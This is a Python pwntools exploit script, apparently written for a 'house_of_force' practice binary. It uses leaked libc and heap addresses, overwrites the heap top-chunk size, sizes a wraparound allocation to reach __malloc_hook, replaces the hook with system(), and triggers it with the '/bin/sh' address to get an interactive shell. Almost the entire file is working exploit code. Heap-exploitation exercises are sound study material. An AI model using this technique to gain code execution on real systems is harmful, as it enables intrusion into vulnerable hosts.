#!/usr/bin/python3

from pwn import *
import struct

elf = context.binary = ELF("house_of_force")
libc = elf.libc

gs = '''
continue
'''

def start():
    #if args.GDB:
        return gdb.debug(elf.path, gdbscript=gs)
    #else:
    #    return process(elf.path)


def malloc(size, data):
    io.send(b"1") # select 1
    io.sendafter(b"size: ", f"{size}".encode())
    io.sendafter(b"data: ", data)
    io.recvuntil(b"> ") # reach > again for prompt

# Calculate the "wraparound" distance between two addresses.
def delta(x, y):
    return (0xffffffffffffffff - x) + y

io = start()

# This binary leaks the address of puts(), use it to resolve the libc load address.
io.recvuntil(b"puts() @ ")
libc.address = int(io.recvline(), 16) - libc.sym.puts

# This binary leaks the heap start address.
io.recvuntil(b"heap @ ")
heap = int(io.recvline(), 16)
target_ptr = int(elf.sym.target)
io.recvuntil(b"> ")
io.timeout = 0.1

# =============================================================================


# The "heap" variable holds the heap start address.
log.info(f"heap: 0x{heap:02x}")

# Program symbols are available via "elf.sym.<symbol name>".
log.info(f"target: 0x{elf.sym.target:02x}")

log.info(f"heap - target = {heap-target_ptr}")

buf = b'Y'*16 + b"/bin/sh\0" + struct.pack("<Q", 0xffffffffffffffff)
malloc(24, buf)


## Overidding target
"""
dist = delta(heap+0x20, elf.sym.target-0x20)

malloc(dist, b'')

buf = b"Much Win" + p64(0) + p64(0) + struct.pack("<Q", 0xffffffffffffffff)

malloc(24, buf)
"""

## gainning code execution

log.info(f"malloc hook addres: {hex(libc.symbols.__malloc_hook)}")

malloc_hook = libc.symbols.__malloc_hook

log.info(f"malloc hook distance: {malloc_hook-heap-0x40}")
log.info(f"system function address: {libc.symbols['system']}")

dist = malloc_hook-heap-0x20-0x20

log.info(f"dist to malloc_hook {dist}")

malloc(dist, b"AAAAAAAA")

malloc(24, p64(libc.symbols['system']))

malloc(next(libc.search(b"/bin/sh")), b"")

# =============================================================================

io.interactive()




